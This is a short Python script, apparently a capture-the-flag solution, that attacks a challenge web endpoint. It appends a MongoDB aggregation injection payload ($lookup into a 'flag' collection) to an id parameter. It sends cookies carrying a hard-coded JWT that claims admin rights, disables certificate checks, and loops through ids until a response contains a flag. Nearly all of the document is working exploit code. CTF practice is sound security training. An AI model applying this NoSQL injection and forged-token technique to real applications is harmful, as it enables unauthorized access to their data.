import requests

payload = '" } }, { "$lookup": { "from": "flag", "localField": "id", "foreignField": "id","pipeline": [{ "$match": {"id":"1"} }], "as": "flag'

cookie ={
    "auth._token.laravelSanctum":"true",
    "auth._token_expiration.laravelSanctum":"false",
    "auth.redirect":"%2Fhome%2F",
    "auth.strategy":"laravelSanctum",
    "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvcnk4NSIsImlzQWRtaW4iOnRydWUsIlN1cGVyQWRtaW4iOmZhbHNlLCJpYXQiOjE3MDY2MzQ2MDAsImV4cCI6MTcwNjY0OTAwMH0.t42uHQRvbFCjaMYoBXKcJBXdAvF5MKlojPHu-4GGcRY"
}

i = 20000
for z in range(10000):
    url = ("https://www.passetonhack.fr/d35efdc849090bf09ebf77e0a9959add/car?id="+str(i))+payload
    response = requests.get(url, cookies=cookie, verify=False)
    if response.status_code == 200:

        print(i , " / ?")
        print (url)
        if "flag{" in response.text:
            print(url)
            break
        i = i + 1
    else:
        print(response.status_code)
        break